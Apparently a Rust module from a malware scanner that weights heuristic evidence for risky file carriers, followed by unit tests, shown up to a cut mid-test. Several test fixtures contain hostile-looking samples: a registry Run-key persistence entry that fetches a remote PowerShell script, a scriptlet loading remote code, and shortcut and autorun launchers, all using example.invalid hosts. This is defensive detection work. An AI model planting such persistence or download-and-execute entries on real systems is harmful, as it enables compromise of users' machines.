use std::path::Path;

use crate::analyzers::StaticAnalysis;
use crate::verdict::risk_fusion::{Evidence, EvidenceSource};

pub fn score_file(path: &Path, analysis: &StaticAnalysis) -> Vec<Evidence> {
    let mut evidence = Vec::new();
    let name_score = super::filename::filename_risk(path);
    if name_score >= 25 {
        evidence.push(Evidence {
            id: "filename_risk".to_string(),
            title: "Suspicious filename pattern".to_string(),
            detail: "The filename uses a deceptive extension or high-risk naming pattern."
                .to_string(),
            weight: name_score,
            source: EvidenceSource::NativeHeuristic,
        });
    } else if name_score > 0 {
        evidence.push(Evidence {
            id: "filename_observation".to_string(),
            title: "Filename observation".to_string(),
            detail:
                "The filename has a weak risk indicator; this is not enough to call it malware."
                    .to_string(),
            weight: name_score.min(8),
            source: EvidenceSource::NativeHeuristic,
        });
    }
    let location_score = super::location::location_risk(path);
    if location_score > 0 {
        evidence.push(Evidence {
            id: "location_observation".to_string(),
            title: "Location observation".to_string(),
            detail: "The file is in a location often reviewed by quick scans. This signal is weak by itself.".to_string(),
            weight: location_score,
            source: EvidenceSource::NativeHeuristic,
        });
    }
    if analysis.entropy_max > 7.45 {
        evidence.push(Evidence {
            id: "high_entropy".to_string(),
            title: "High entropy content".to_string(),
            detail: "One or more regions look packed or encrypted. Avorax treats this as suspicious only with other signals.".to_string(),
            weight: 18,
            source: EvidenceSource::NativeHeuristic,
        });
    }
    if let Some(script) = &analysis.script {
        if script.encoded_command {
            evidence.push(Evidence {
                id: "encoded_script_command".to_string(),
                title: "Encoded script command".to_string(),
                detail: "The script contains encoded command indicators.".to_string(),
                weight: 20,
                source: EvidenceSource::NativeHeuristic,
            });
        }
        if script.downloader_patterns > 0 && script.execution_patterns > 0 {
            evidence.push(Evidence {
                id: "download_execute_script".to_string(),
                title: "Downloader plus execution script pattern".to_string(),
                detail: "The script combines download and execution behavior.".to_string(),
                weight: 35,
                source: EvidenceSource::NativeHeuristic,
            });
        }
        if script.security_tamper_indicators > 0 {
            evidence.push(Evidence {
                id: "security_tamper_script".to_string(),
                title: "Security tamper indicator".to_string(),
                detail: "The script references backup or security setting tamper commands."
                    .to_string(),
                weight: 35,
                source: EvidenceSource::NativeHeuristic,
            });
        }
    }
    if is_registry_carrier(path)
        && analysis.string_indicators.registry_autorun_count > 0
        && (analysis.string_indicators.remote_executable_url_count > 0
            || analysis
                .string_indicators
                .remote_network_executable_path_count
                > 0
            || analysis.string_indicators.script_host_reference_count > 0)
    {
        evidence.push(Evidence {
            id: "registry_autorun_remote_launch".to_string(),
            title: "Registry autorun remote launch carrier".to_string(),
            detail: "Registry carrier sets autorun persistence and references a remote executable/script or script host; review before importing it.".to_string(),
            weight: 45,
            source: EvidenceSource::NativeHeuristic,
        });
    }
    if is_autorun_inf_carrier(path)
        && analysis
            .string_indicators
            .autorun_inf_executable_command_count
            > 0
    {
        evidence.push(Evidence {
            id: "autorun_inf_executable_launch".to_string(),
            title: "Autorun INF executable launch carrier".to_string(),
            detail: "Autorun INF content references an executable or script launch command; review removable-media style carriers before trusting them.".to_string(),
            weight: 40,
            source: EvidenceSource::NativeHeuristic,
        });
    }
    if is_disk_image_carrier(path)
        && analysis
            .string_indicators
            .disk_image_autorun_executable_count
            > 0
    {
        evidence.push(Evidence {
            id: "disk_image_autorun_executable".to_string(),
            title: "Disk image autorun executable carrier".to_string(),
            detail: "Disk image metadata references autorun content and an executable or script; review before mounting it.".to_string(),
            weight: 40,
            source: EvidenceSource::NativeHeuristic,
        });
    }
    if is_email_message_carrier(path)
        && analysis.string_indicators.email_executable_attachment_count > 0
    {
        evidence.push(Evidence {
            id: "email_executable_attachment".to_string(),
            title: "Email executable attachment carrier".to_string(),
            detail: "Email message metadata references an executable or script attachment; review before opening attachments.".to_string(),
            weight: 40,
            source: EvidenceSource::NativeHeuristic,
        });
    }
    if is_shortcut_carrier(path)
        && (analysis.string_indicators.remote_executable_url_count > 0
            || analysis
                .string_indicators
                .remote_network_executable_path_count
                > 0)
    {
        evidence.push(Evidence {
            id: "shortcut_remote_executable_launch".to_string(),
            title: "Shortcut downloader carrier".to_string(),
            detail: "Shortcut or shell-command carrier references a remote executable or script URL; review before opening it.".to_string(),
            weight: 40,
            source: EvidenceSource::NativeHeuristic,
        });
    }
    if is_clickonce_carrier(path)
        && (analysis.string_indicators.clickonce_marker_count > 0
            || analysis.string_indicators.remote_clickonce_url_count > 0)
        && (analysis.string_indicators.remote_executable_url_count > 0
            || analysis.string_indicators.remote_clickonce_url_count > 0
            || analysis
                .string_indicators
                .remote_network_executable_path_count
                > 0)
    {
        evidence.push(Evidence {
            id: "clickonce_remote_deployment_launch".to_string(),
            title: "ClickOnce downloader carrier".to_string(),
            detail: "ClickOnce application/reference carrier includes deployment metadata that points to a remote application, executable, or script; review before opening it.".to_string(),
            weight: 40,
            source: EvidenceSource::NativeHeuristic,
        });
    }
    if is_java_web_start_carrier(path)
        && analysis.string_indicators.java_web_start_marker_count > 0
        && (analysis.string_indicators.remote_java_web_start_url_count > 0
            || analysis.string_indicators.remote_executable_url_count > 0
            || analysis
                .string_indicators
                .remote_network_executable_path_count
                > 0)
    {
        evidence.push(Evidence {
            id: "java_web_start_remote_archive_launch".to_string(),
            title: "Java Web Start downloader carrier".to_string(),
            detail: "JNLP/Web Start carrier references remote Java archive or launcher content; review before opening it.".to_string(),
            weight: 40,
            source: EvidenceSource::NativeHeuristic,
        });
    }
    if is_windows_scriptlet_carrier(path)
        && analysis.string_indicators.windows_scriptlet_marker_count > 0
        && (analysis.string_indicators.remote_executable_url_count > 0
            || analysis
                .string_indicators
                .remote_network_executable_path_count
                > 0
            || (analysis.string_indicators.script_host_reference_count > 0
                && analysis.string_indicators.suspicious_string_count > 0))
    {
        evidence.push(Evidence {
            id: "windows_scriptlet_remote_script_launch".to_string(),
            title: "Windows scriptlet downloader carrier".to_string(),
            detail: "Windows scriptlet carrier includes scriptlet metadata with remote executable/script or script-host downloader evidence; review before registering or opening it.".to_string(),
            weight: 40,
            source: EvidenceSource::NativeHeuristic,
        });
    }
    if is_windows_installer_carrier(path)
        && analysis.string_indicators.windows_installer_marker_count > 0
        && analysis
            .string_indicators
            .windows_installer_custom_action_count
            > 0
        && (analysis.string_indicators.remote_executable_url_count > 0
            || analysis
                .string_indicators
                .remote_network_executable_path_count
                > 0
            || (analysis.string_indicators.script_host_reference_count > 0
                && analysis.string_indicators.suspicious_string_count > 0))
    {
        evidence.push(Evidence {
            id: "windows_installer_custom_action_remote_launch".to_string(),
            title: "Windows Installer custom-action downloader carrier".to_string(),
            detail: "Windows Installer carrier includes custom-action metadata with remote executable/script or script-host downloader evidence; review before installing it.".to_string(),
            weight: 40,
            source: EvidenceSource::NativeHeuristic,
        });
    }
    if is_windows_appinstaller_carrier(path)
        && analysis.string_indicators.windows_appinstaller_marker_count > 0
        && analysis
            .string_indicators
            .remote_windows_app_package_url_count
            > 0
    {
        evidence.push(Evidence {
            id: "windows_appinstaller_remote_package_launch".to_string(),
            title: "Windows App Installer downloader carrier".to_string(),
            detail: "Windows App Installer manifest references a remote APPX/MSIX package or bundle; review before installing or opening it.".to_string(),
            weight: 40,
            source: EvidenceSource::NativeHeuristic,
        });
    }
    if is_office_query_or_sheet_carrier(path)
        && (analysis.string_indicators.remote_executable_url_count > 0
            || analysis.string_indicators.script_host_reference_count > 0)
    {
        evidence.push(Evidence {
            id: "office_query_remote_script_launch".to_string(),
            title: "Office query/spreadsheet downloader carrier".to_string(),
            detail: "Office query or spreadsheet carrier references a remote executable/script URL or script host; review before opening it in Office.".to_string(),
            weight: 40,
            source: EvidenceSource::NativeHeuristic,
        });
    }
    if is_macro_capable_office_carrier(path)
        && analysis.string_indicators.macro_auto_run_count > 0
        && (analysis.string_indicators.remote_executable_url_count > 0
            || analysis
                .string_indicators
                .remote_network_executable_path_count
                > 0
            || analysis.string_indicators.script_host_reference_count > 0
            || analysis.string_indicators.suspicious_string_count > 0)
    {
        evidence.push(Evidence {
            id: "office_macro_auto_run_remote_launch".to_string(),
            title: "Office macro downloader carrier".to_string(),
            detail: "Office macro-capable document contains auto-run macro terms plus remote executable/script, script-host, or downloader evidence; review before enabling macros.".to_string(),
            weight: 45,
            source: EvidenceSource::NativeHeuristic,
        });
    }
    if is_office_addin_carrier(path)
        && (analysis.string_indicators.remote_executable_url_count > 0
            || (analysis.string_indicators.script_host_reference_count > 0
                && analysis.string_indicators.suspicious_string_count > 0))
    {
        evidence.push(Evidence {
            id: "office_addin_remote_script_launch".to_string(),
            title: "Office add-in downloader carrier".to_string(),
            detail: "Office add-in carrier references a remote executable/script URL, or combines script-host and downloader/execution terms; review before loading it in Office.".to_string(),
            weight: 40,
            source: EvidenceSource::NativeHeuristic,
        });
    }
    if is_rtf_carrier(path)
        && analysis.string_indicators.rtf_external_object_count > 0
        && (analysis.string_indicators.remote_executable_url_count > 0
            || analysis
                .string_indicators
                .remote_network_executable_path_count
                > 0
            || (analysis.string_indicators.script_host_reference_count > 0
                && analysis.string_indicators.suspicious_string_count > 0))
    {
        evidence.push(Evidence {
            id: "rtf_external_object_remote_launch".to_string(),
            title: "RTF external object downloader carrier".to_string(),
            detail: "RTF document contains object, template, or field control words with remote executable/script, script-host, or downloader evidence; review before opening it.".to_string(),
            weight: 40,
            source: EvidenceSource::NativeHeuristic,
        });
    }
    if is_pdf_carrier(path)
        && analysis.string_indicators.pdf_active_content_count > 0
        && (analysis.string_indicators.remote_executable_url_count > 0
            || analysis
                .string_indicators
                .remote_network_executable_path_count
                > 0
            || (analysis.string_indicators.script_host_reference_count > 0
                && analysis.string_indicators.suspicious_string_count > 0))
    {
        evidence.push(Evidence {
            id: "pdf_active_content_remote_launch".to_string(),
            title: "PDF active-content downloader carrier".to_string(),
            detail: "PDF document contains active content markers with remote executable/script, script-host, or downloader evidence; review before opening it.".to_string(),
            weight: 40,
            source: EvidenceSource::NativeHeuristic,
        });
    }
    if is_web_document_carrier(path)
        && analysis.string_indicators.web_document_active_content_count > 0
        && (analysis.string_indicators.remote_executable_url_count > 0
            || analysis
                .string_indicators
                .remote_network_executable_path_count
                > 0
            || (analysis.string_indicators.script_host_reference_count > 0
                && analysis.string_indicators.suspicious_string_count > 0))
    {
        evidence.push(Evidence {
            id: "web_document_active_content_remote_launch".to_string(),
            title: "Web document downloader carrier".to_string(),
            detail: "HTML or SVG document contains active content markers with remote executable/script, script-host, or downloader evidence; review before opening it in a browser.".to_string(),
            weight: 40,
            source: EvidenceSource::NativeHeuristic,
        });
    }
    if is_help_or_note_carrier(path)
        && (analysis.string_indicators.remote_executable_url_count > 0
            || (analysis.string_indicators.script_host_reference_count > 0
                && analysis.string_indicators.suspicious_string_count > 0))
    {
        evidence.push(Evidence {
            id: "help_note_remote_script_launch".to_string(),
            title: "Help/OneNote downloader carrier".to_string(),
            detail: "Compiled help or OneNote carrier references a remote executable/script URL, or combines script-host and downloader/execution terms; review before opening it.".to_string(),
            weight: 40,
            source: EvidenceSource::NativeHeuristic,
        });
    }
    if is_macro_enabled_ooxml_office_carrier(path) {
        if let Some(archive) = &analysis.archive {
            if archive.ooxml_vba_project_count > 0
                && archive.ooxml_remote_executable_relationship_count > 0
            {
                evidence.push(Evidence {
                    id: "ooxml_macro_external_remote_relationship".to_string(),
                    title: "Macro-enabled Office external relationship carrier".to_string(),
                    detail: "Macro-enabled Office package contains a VBA project plus an external relationship to a remote executable or script; review before enabling macros or opening the document.".to_string(),
                    weight: 45,
                    source: EvidenceSource::NativeHeuristic,
                });
            }
        }
    }
    if let Some(pe) = &analysis.pe {
        let import_score = pe.suspicious_imports.process_injection * 12
            + pe.suspicious_imports.credential_access * 14
            + pe.suspicious_imports.persistence * 10
            + pe.suspicious_imports.anti_debugging * 8;
        if import_score > 0 {
            evidence.push(Evidence {
                id: "suspicious_imports".to_string(),
                title: "Suspicious import categories".to_string(),
                detail: "The executable imports APIs associated with injection, credential access, persistence, or anti-debugging.".to_string(),
                weight: import_score.min(45) as i32,
                source: EvidenceSource::NativeHeuristic,
            });
        }
    }
    if let Some(archive) = &analysis.archive {
        if archive.zip_slip_blocked {
            evidence.push(Evidence {
                id: "archive_zip_slip".to_string(),
                title: "Unsafe archive path blocked".to_string(),
                detail: "The archive contains path traversal entries.".to_string(),
                weight: 45,
                source: EvidenceSource::NativeHeuristic,
            });
        }
        if archive.contains_executable && archive.suspicious_nested_name_count > 0 {
            evidence.push(Evidence {
                id: "archive_suspicious_executable".to_string(),
                title: "Suspicious executable inside archive".to_string(),
                detail: "The archive contains executable entries with suspicious names."
                    .to_string(),
                weight: 25,
                source: EvidenceSource::NativeHeuristic,
            });
        }
        if archive.autorun_inf_entry_count > 0 && archive.autorun_executable_entry_count > 0 {
            evidence.push(Evidence {
                id: "archive_autorun_executable_bundle".to_string(),
                title: "Archive autorun executable bundle".to_string(),
                detail: "The ZIP archive contains autorun metadata and an executable or script companion; review before extracting or running bundled files.".to_string(),
                weight: 35,
                source: EvidenceSource::NativeHeuristic,
            });
        }
        if archive.autorun_inf_executable_command_count > 0
            && archive.autorun_executable_entry_count > 0
        {
            evidence.push(Evidence {
                id: "archive_autorun_inf_executable_command".to_string(),
                title: "Archive autorun executable command".to_string(),
                detail: "The ZIP archive contains bounded autorun.inf metadata that launches an executable or script companion; review before extracting or running bundled files.".to_string(),
                weight: 45,
                source: EvidenceSource::NativeHeuristic,
            });
        }
        if archive.shortcut_entry_count > 0 && archive.contains_executable {
            evidence.push(Evidence {
                id: "archive_shortcut_executable_bundle".to_string(),
                title: "Archive shortcut executable bundle".to_string(),
                detail: "The ZIP archive contains a shortcut carrier and an executable or script companion; review before extracting or opening bundled shortcuts.".to_string(),
                weight: 35,
                source: EvidenceSource::NativeHeuristic,
            });
        }
    }
    evidence
}

fn is_registry_carrier(path: &Path) -> bool {
    extension_matches(path, &["reg"])
}

fn is_autorun_inf_carrier(path: &Path) -> bool {
    extension_matches(path, &["inf"])
}

fn is_disk_image_carrier(path: &Path) -> bool {
    extension_matches(path, &["iso", "img"])
}

fn is_email_message_carrier(path: &Path) -> bool {
    extension_matches(path, &["eml"])
}

fn is_shortcut_carrier(path: &Path) -> bool {
    extension_matches(path, &["lnk", "url", "scf"])
}

fn is_clickonce_carrier(path: &Path) -> bool {
    extension_matches(path, &["application", "appref-ms"])
}

fn is_java_web_start_carrier(path: &Path) -> bool {
    extension_matches(path, &["jnlp"])
}

fn is_windows_scriptlet_carrier(path: &Path) -> bool {
    extension_matches(path, &["sct", "wsc"])
}

fn is_windows_installer_carrier(path: &Path) -> bool {
    extension_matches(path, &["msi", "msp"])
}

fn is_windows_appinstaller_carrier(path: &Path) -> bool {
    extension_matches(path, &["appinstaller"])
}

fn is_office_query_or_sheet_carrier(path: &Path) -> bool {
    extension_matches(path, &["iqy", "slk"])
}

fn is_macro_capable_office_carrier(path: &Path) -> bool {
    extension_matches(path, &["docm", "xlsm", "pptm", "doc", "xls", "ppt"])
}

fn is_macro_enabled_ooxml_office_carrier(path: &Path) -> bool {
    extension_matches(path, &["docm", "xlsm", "pptm"])
}

fn is_office_addin_carrier(path: &Path) -> bool {
    extension_matches(path, &["xlam", "xll"])
}

fn is_rtf_carrier(path: &Path) -> bool {
    extension_matches(path, &["rtf"])
}

fn is_pdf_carrier(path: &Path) -> bool {
    extension_matches(path, &["pdf"])
}

fn is_web_document_carrier(path: &Path) -> bool {
    extension_matches(path, &["html", "htm", "svg"])
}

fn is_help_or_note_carrier(path: &Path) -> bool {
    extension_matches(path, &["chm", "one", "onepkg"])
}

fn extension_matches(path: &Path, expected: &[&str]) -> bool {
    path.extension()
        .map(|value| value.to_string_lossy().to_ascii_lowercase())
        .is_some_and(|extension| expected.contains(&extension.as_str()))
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::analyzers::analyze_path;

    #[test]
    fn registry_autorun_remote_launch_is_review_evidence() {
        let analysis = analyze_path(
            Path::new("autorun.reg"),
            br#"
Windows Registry Editor Version 5.00
[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run]
"Updater"="powershell https://example.invalid/update.ps1"
"#,
        )
        .unwrap();

        let evidence = score_file(Path::new("autorun.reg"), &analysis);

        assert!(evidence
            .iter()
            .any(|item| item.id == "registry_autorun_remote_launch" && item.weight == 45));
    }

    #[test]
    fn autorun_inf_local_executable_launch_is_review_evidence() {
        let analysis = analyze_path(
            Path::new("autorun.inf"),
            br#"
[autorun]
open=support.exe /quiet
shell\open\command=cmd.exe /c support.cmd
"#,
        )
        .unwrap();

        let evidence = score_file(Path::new("autorun.inf"), &analysis);

        assert!(evidence
            .iter()
            .any(|item| item.id == "autorun_inf_executable_launch" && item.weight == 40));
    }

    #[test]
    fn autorun_inf_remote_script_launch_is_review_evidence() {
        let analysis = analyze_path(
            Path::new("media-autorun.inf"),
            br#"
[autorun]
shellexecute=file://fileserver/share/support.vbs
"#,
        )
        .unwrap();

        let evidence = score_file(Path::new("media-autorun.inf"), &analysis);

        assert!(evidence
            .iter()
            .any(|item| item.id == "autorun_inf_executable_launch" && item.weight == 40));
    }

    #[test]
    fn ordinary_driver_inf_is_not_autorun_review_evidence() {
        let analysis = analyze_path(
            Path::new("driver.inf"),
            br#"
[version]
signature="$windows nt$"
[manufacturer]
%mfg%=models,ntamd64
"#,
        )
        .unwrap();

        let evidence = score_file(Path::new("driver.inf"), &analysis);

        assert!(!evidence
            .iter()
            .any(|item| item.id == "autorun_inf_executable_launch"));
    }

    #[test]
    fn autorun_inf_document_link_is_not_review_evidence() {
        let analysis = analyze_path(
            Path::new("autorun.inf"),
            br#"
[autorun]
open=readme.txt
shellexecute=https://example.invalid/readme.html
"#,
        )
        .unwrap();

        let evidence = score_file(Path::new("autorun.inf"), &analysis);

        assert!(!evidence
            .iter()
            .any(|item| item.id == "autorun_inf_executable_launch"));
    }

    #[test]
    fn disk_image_autorun_executable_is_review_evidence() {
        let mut bytes = vec![0u8; 32 * 1024];
        bytes.extend_from_slice(b"CD001");
        bytes.extend_from_slice(b"\0AUTORUN.INF\0[autorun]\0open=setup.exe\0");
        let analysis = analyze_path(Path::new("support.iso"), &bytes).unwrap();

        let evidence = score_file(Path::new("support.iso"), &analysis);

        assert!(evidence
            .iter()
            .any(|item| item.id == "disk_image_autorun_executable" && item.weight == 40));
    }

    #[test]
    fn disk_image_autorun_document_link_is_not_review_evidence() {
        let mut bytes = vec![0u8; 32 * 1024];
        bytes.extend_from_slice(b"CD001");
        bytes.extend_from_slice(b"\0AUTORUN.INF\0[autorun]\0open=readme.pdf\0");
        let analysis = analyze_path(Path::new("support.iso"), &bytes).unwrap();

        let evidence = score_file(Path::new("support.iso"), &analysis);

        assert!(!evidence
            .iter()
            .any(|item| item.id == "disk_image_autorun_executable"));
    }

    #[test]
    fn non_disk_image_autorun_words_are_not_review_evidence() {
        let analysis = analyze_path(
            Path::new("notes.iso"),
            b"autorun.inf [autorun] open=setup.exe",
        )
        .unwrap();

        let evidence = score_file(Path::new("notes.iso"), &analysis);

        assert!(!evidence
            .iter()
            .any(|item| item.id == "disk_image_autorun_executable"));
    }

    #[test]
    fn zip_autorun_executable_bundle_is_review_evidence() {
        let analysis = analyze_path(
            Path::new("media-bundle.zip"),
            &zip_with_stored_entries(&[
                (b"autorun.inf", b"[autorun]\nopen=setup.exe\n".as_slice()),
                (b"bin/setup.exe", b"placeholder".as_slice()),
            ]),
        )
        .unwrap();

        let evidence = score_file(Path::new("media-bundle.zip"), &analysis);

        assert!(evidence
            .iter()
            .any(|item| { item.id == "archive_autorun_executable_bundle" && item.weight == 35 }));
    }

    #[test]
    fn zip_autorun_inf_executable_command_is_review_evidence() {
        let analysis = analyze_path(
            Path::new("media-autoplay.zip"),
            &zip_with_stored_entries(&[
                (b"autorun.inf", b"[autorun]\nopen=setup.exe\n".as_slice()),
                (b"setup/setup.exe", b"placeholder".as_slice()),
            ]),
        )
        .unwrap();

        let evidence = score_file(Path::new("media-autoplay.zip"), &analysis);

        assert!(evidence.iter().any(|item| {
            item.id == "archive_autorun_inf_executable_command" && item.weight == 45
        }));
    }

    #[test]
    fn zip_autorun_without_executable_companion_is_not_review_evidence() {
        let analysis = analyze_path(
            Path::new("docs.zip"),
            &zip_with_stored_entries(&[
                (b"autorun.inf", b"[autorun]\nopen=readme.pdf\n".as_slice()),
                (b"docs/readme.pdf", b"placeholder".as_slice()),
            ]),
        )
        .unwrap();

        let evidence = score_file(Path::new("docs.zip"), &analysis);

        assert!(!evidence
            .iter()
            .any(|item| item.id == "archive_autorun_executable_bundle"));
        assert!(!evidence
            .iter()
            .any(|item| item.id == "archive_autorun_inf_executable_command"));
    }

    #[test]
    fn zip_shortcut_executable_bundle_is_review_evidence() {
        let analysis = analyze_path(
            Path::new("shortcut-bundle.zip"),
            &zip_with_stored_entries(&[
                (b"launch/support.lnk", b"shortcut placeholder".as_slice()),
                (b"bin/support.exe", b"placeholder".as_slice()),
            ]),
        )
        .unwrap();

        let evidence = score_file(Path::new("shortcut-bundle.zip"), &analysis);

        assert!(evidence
            .iter()
            .any(|item| { item.id == "archive_shortcut_executable_bundle" && item.weight == 35 }));
    }

    #[test]
    fn zip_shortcut_without_executable_companion_is_not_review_evidence() {
        let analysis = analyze_path(
            Path::new("shortcut-docs.zip"),
            &zip_with_stored_entries(&[
                (
                    b"launch/readme.url",
                    b"[InternetShortcut]\nURL=https://example.invalid/readme\n".as_slice(),
                ),
                (b"docs/readme.pdf", b"placeholder".as_slice()),
            ]),
        )
        .unwrap();

        let evidence = score_file(Path::new("shortcut-docs.zip"), &analysis);

        assert!(!evidence
            .iter()
            .any(|item| item.id == "archive_shortcut_executable_bundle"));
    }

    #[test]
    fn email_executable_attachment_is_review_evidence() {
        let analysis = analyze_path(
            Path::new("invoice.eml"),
            br#"From: billing@example.invalid
Subject: invoice
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="b"

--b
Content-Type: application/octet-stream; name="invoice.exe"
Content-Disposition: attachment; filename="invoice.exe"

placeholder
--b--
"#,
        )
        .unwrap();

        let evidence = score_file(Path::new("invoice.eml"), &analysis);

        assert!(evidence
            .iter()
            .any(|item| item.id == "email_executable_attachment" && item.weight == 40));
    }

    #[test]
    fn ordinary_email_document_attachment_is_not_review_evidence() {
        let analysis = analyze_path(
            Path::new("notes.eml"),
            br#"From: docs@example.invalid
Subject: notes
MIME-Version: 1.0
Content-Type: text/plain; name="readme.txt"
Content-Disposition: attachment; filename="readme.txt"
"#,
        )
        .unwrap();

        let evidence = score_file(Path::new("notes.eml"), &analysis);

        assert!(!evidence
            .iter()
            .any(|item| item.id == "email_executable_attachment"));
    }

    #[test]
    fn non_email_attachment_words_are_not_review_evidence() {
        let analysis = analyze_path(
            Path::new("attachment.txt"),
            br#"Content-Disposition: attachment; filename="invoice.exe"
MIME-Version: 1.0
"#,
        )
        .unwrap();

        let evidence = score_file(Path::new("attachment.txt"), &analysis);

        assert!(!evidence
            .iter()
            .any(|item| item.id == "email_executable_attachment"));
    }

    #[test]
    fn shortcut_remote_executable_url_is_review_evidence() {
        let analysis = analyze_path(
            Path::new("support.url"),
            b"[InternetShortcut]\nURL=https://example.invalid/support.exe",
        )
        .unwrap();

        let evidence = score_file(Path::new("support.url"), &analysis);

        assert!(evidence
            .iter()
            .any(|item| item.id == "shortcut_remote_executable_launch" && item.weight == 40));
    }

    #[test]
    fn lnk_remote_executable_url_is_review_evidence() {
        let analysis = analyze_path(
            Path::new("support.lnk"),
            &utf16le_bytes("Shell link target https://example.invalid/support.ps1 cmd.exe"),
        )
        .unwrap();

        let evidence = score_file(Path::new("support.lnk"), &analysis);

        assert!(evidence
            .iter()
            .any(|item| item.id == "shortcut_remote_executable_launch" && item.weight == 40));
    }

    #[test]
    fn lnk_unc_executable_path_is_review_evidence() {
        let analysis = analyze_path(
            Path::new("support-share.lnk"),
            &utf16le_bytes(r"Shell link target \\fileserver\share\support.ps1"),
        )
        .unwrap();

        let evidence = score_file(Path::new("support-share.lnk"), &analysis);

        assert!(evidence
            .iter()
            .any(|item| item.id == "shortcut_remote_executable_launch" && item.weight == 40));
    }

    #[test]
    fn ordinary_shortcut_url_is_not_review_evidence() {
        let analysis = analyze_path(
            Path::new("docs.url"),
            b"[InternetShortcut]\nURL=https://example.invalid/readme.html",
        )
        .unwrap();

        let evidence = score_file(Path::new("docs.url"), &analysis);

        assert!(!evidence
            .iter()
            .any(|item| item.id == "shortcut_remote_executable_launch"));
    }

    #[test]
    fn ordinary_lnk_web_link_is_not_review_evidence() {
        let analysis = analyze_path(
            Path::new("docs.lnk"),
            &utf16le_bytes("Shell link docs https://example.invalid/readme.html"),
        )
        .unwrap();

        let evidence = score_file(Path::new("docs.lnk"), &analysis);

        assert!(!evidence
            .iter()
            .any(|item| item.id == "shortcut_remote_executable_launch"));
    }

    #[test]
    fn ordinary_lnk_unc_document_path_is_not_review_evidence() {
        let analysis = analyze_path(
            Path::new("docs-share.lnk"),
            &utf16le_bytes(r"Shell link docs \\fileserver\share\readme.txt"),
        )
        .unwrap();

        let evidence = score_file(Path::new("docs-share.lnk"), &analysis);

        assert!(!evidence
            .iter()
            .any(|item| item.id == "shortcut_remote_executable_launch"));
    }

    #[test]
    fn clickonce_application_remote_executable_is_review_evidence() {
        let analysis = analyze_path(
            Path::new("support.application"),
            br#"<assembly xmlns:asmv2="urn:schemas-microsoft-com:asm.v2">
<asmv2:deployment install="true">
<asmv2:deploymentProvider codebase="https://example.invalid/setup.exe" />
</asmv2:deployment>
</assembly>"#,
        )
        .unwrap();

        let evidence = score_file(Path::new("support.application"), &analysis);

        assert!(evidence
            .iter()
            .any(|item| { item.id == "clickonce_remote_deployment_launch" && item.weight == 40 }));
    }

    #[test]
    fn clickonce_appref_ms_remote_application_is_review_evidence() {
        let analysis = analyze_path(
            Path::new("support.appref-ms"),
            b"https://example.invalid/Support.application#Support, Culture=neutral",
        )
        .unwrap();

        let evidence = score_file(Path::new("support.appref-ms"), &analysis);

        assert!(evidence
            .iter()
            .any(|item| { item.id == "clickonce_remote_deployment_launch" && item.weight == 40 }));
    }

    #[test]
    fn ordinary_application_xml_is_not_clickonce_review_evidence() {
        let analysis = analyze_path(
            Path::new("docs.application"),
            br#"<application><link href="https://example.invalid/readme.html" /></application>"#,
        )
        .unwrap();

        let evidence = score_file(Path::new("docs.application"), &analysis);

        assert!(!evidence
            .iter()
            .any(|item| item.id == "clickonce_remote_deployment_launch"));
    }

    #[test]
    fn java_web_start_remote_jar_is_review_evidence() {
        let analysis = analyze_path(
            Path::new("support.jnlp"),
            br#"<jnlp spec="1.0+" codebase="https://example.invalid/app/">
<resources><jar href="https://example.invalid/app/support.jar" /></resources>
<application-desc main-class="com.example.Support" />
</jnlp>"#,
        )
        .unwrap();

        let evidence = score_file(Path::new("support.jnlp"), &analysis);

        assert!(evidence.iter().any(|item| {
            item.id == "java_web_start_remote_archive_launch" && item.weight == 40
        }));
    }

    #[test]
    fn ordinary_java_web_start_document_link_is_not_review_evidence() {
        let analysis = analyze_path(
            Path::new("docs.jnlp"),
            br#"<jnlp spec="1.0+"><information href="https://example.invalid/readme.html" /></jnlp>"#,
        )
        .unwrap();

        let evidence = score_file(Path::new("docs.jnlp"), &analysis);

        assert!(!evidence
            .iter()
            .any(|item| item.id == "java_web_start_remote_archive_launch"));
    }

    #[test]
    fn non_jnlp_java_web_start_text_is_not_review_evidence() {
        let analysis = analyze_path(
            Path::new("docs.xml"),
            br#"<jnlp spec="1.0+"><resources><jar href="https://example.invalid/app/support.jar" /></resources></jnlp>"#,
        )
        .unwrap();

        let evidence = score_file(Path::new("docs.xml"), &analysis);

        assert!(!evidence
            .iter()
            .any(|item| item.id == "java_web_start_remote_archive_launch"));
    }

    #[test]
    fn windows_scriptlet_remote_script_is_review_evidence() {
        let analysis = analyze_path(
            Path::new("loader.sct"),
            br#"<scriptlet>
<registration progid="Support.Loader" />
<script language="JScript">var x = GetObject("script:https://example.invalid/loader.sct");</script>
</scriptlet>"#,
        )
        .unwrap();

        let evidence = score_file(Path::new("loader.sct"), &analysis);

        assert!(evidence.iter().any(|item| {
            item.id == "windows_scriptlet_remote_script_launch" && item.weight == 40
        }));
    }

    #[test]
    fn windows_scriptlet_component_script_host_is_review_evidence() {
        let analysis = analyze_path(
            Path::new("component.wsc"),
            br#"<component><registration progid="Support.Component" />
<script language="VBScript">CreateObject("WScript.Shell"): x="downloadstring"</script>
</component>"#,
        )
        .unwrap();

        let evidence = score_file(Path::new("component.wsc"), &analysis);

        assert!(evidence.iter().any(|item| {
            item.id == "windows_scriptlet_remote_script_launch" && item.weight == 40
        }));
    }

    #[test]
    fn ordinary_windows_scriptlet_document_link_is_not_review_evidence() {
        let analysis = analyze_path(
            Path::new("docs.sct"),
            br#"<scriptlet><registration progid="Docs.Viewer" /><script language="JScript">var help="https://example.invalid/readme.html";</script></scriptlet>"#,
        )
        .unwrap();

        let evidence = score_file(Path::new("docs.sct"), &analysis);

        assert!(!evidence
            .iter()
            .any(|item| item.id == "windows_scriptlet_remote_script_launch"));
    }

    #[test]
    fn non_scriptlet_remote_sct_text_is_not_review_evidence() {
        let analysis = analyze_path(
            Path::new("notes.xml"),
            br#"<scriptlet><registration progid="Support.Loader" /><script language="JScript">var x = "https://example.invalid/loader.sct";</script></scriptlet>"#,
        )
        .unwrap();

        let evidence = score_file(Path::new("notes.xml"), &analysis);

        assert!(!evidence
            .iter()
            .any(|item| item.id == "windows_scriptlet_remote_script_launch"));
    }

    #[test]
    fn windows_installer_custom_action_remote_installer_is_review_evidence() {
        let mut bytes = compound_file_fixture();
        bytes.extend_from_slice(
            b"Windows Installer CustomAction WixQuietExec https://example.invalid/patch.msp",
        );
        let analysis = analyze_path(Path::new("support.msi"), &bytes).unwrap();

